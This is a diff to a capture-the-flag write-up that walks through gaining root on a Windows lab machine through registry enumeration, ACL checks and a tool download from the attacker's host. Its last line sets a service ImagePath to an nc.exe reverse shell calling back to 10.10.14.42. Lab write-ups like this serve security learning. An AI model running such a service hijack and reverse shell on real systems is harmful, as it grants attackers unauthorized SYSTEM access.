@@ -409,12 +409,99 @@ d8782dd01fb15b72c4b5ba77ef2d472b
 
 ## 3. Getting Root
 
+Taking a look at the PowerShell command history.<br>
+We can find only 2 commands.
 ```shell
 PS C:\> gc (get-PSReadlineOption).HistorySavePath
 gc (get-PSReadlineOption).HistorySavePath
 get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
 get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
 ```
+
+```shell
+PS C:\Users\Hector\Documents> get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
+get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
+
+
+Property      : {BootDriverFlags, CurrentUser, EarlyStartServices, PreshutdownOrder...}
+PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control
+PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
+PSChildName   : Control
+PSDrive       : HKLM
+PSProvider    : Microsoft.PowerShell.Core\Registry
+PSIsContainer : True
+SubKeyCount   : 121
+View          : Default
+Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
+ValueCount    : 11
+Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control
+
+Property      : {NextParentID.daba3ff.2, NextParentID.61aaa01.3, NextParentID.1bd7f811.4, NextParentID.2032e665.5...}
+PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Enum
+PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
+PSChildName   : Enum
+PSDrive       : HKLM
+PSProvider    : Microsoft.PowerShell.Core\Registry
+PSIsContainer : True
+SubKeyCount   : 17
+View          : Default
+Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
+ValueCount    : 27
+Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Enum
+
+Property      : {}
+PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Hardware Profiles
+PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
+PSChildName   : Hardware Profiles
+PSDrive       : HKLM
+PSProvider    : Microsoft.PowerShell.Core\Registry
+PSIsContainer : True
+SubKeyCount   : 3
+View          : Default
+Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
+ValueCount    : 0
+Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Hardware Profiles
+
+Property      : {}
+PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Policies
+PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
+PSChildName   : Policies
+PSDrive       : HKLM
+PSProvider    : Microsoft.PowerShell.Core\Registry
+PSIsContainer : True
+SubKeyCount   : 0
+View          : Default
+Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
+ValueCount    : 0
+Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Policies
+
+Property      : {}
+PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services
+PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
+PSChildName   : Services
+PSDrive       : HKLM
+PSProvider    : Microsoft.PowerShell.Core\Registry
+PSIsContainer : True
+SubKeyCount   : 667
+View          : Default
+Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
+ValueCount    : 0
+Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services
+
+Property      : {}
+PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Software
+PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
+PSChildName   : Software
+PSDrive       : HKLM
+PSProvider    : Microsoft.PowerShell.Core\Registry
+PSIsContainer : True
+SubKeyCount   : 1
+View          : Default
+Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
+ValueCount    : 0
+Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Software
+```
+
 
 ```shell
 PS C:\> get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
@@ -447,6 +534,27 @@ Sddl   : O:BAG:SYD:AI(A;;KA;;;BA)(A;ID;KR;;;AU)(A;CIIOID;GR;;;AU)(A;ID;KR;;;SO)(
          -1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)
 ```
 
+```shell
+root@kali:~# python -m SimpleHTTPServer 
+Serving HTTP on 0.0.0.0 port 8000 ...
+
+```
+
+```shell
+PS C:\Users\Hector\Documents> wget http://10.10.14.42:8000/accesschk.exe -O accesschk.exe
+wget http://10.10.14.42:8000/accesschk.exe -O accesschk.exe
+PS C:\Users\Hector\Documents> ls
+ls
+
+
+    Directory: C:\Users\Hector\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        8/23/2020   6:19 AM         792208 accesschk.exe
+
+```
 
 ```shell
 PS C:\> reg add "HKLM\System\CurrentControlSet\services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "C:\inetpub\wwwroot\nc.exe -e powershell 10.10.14.42 4445" /f
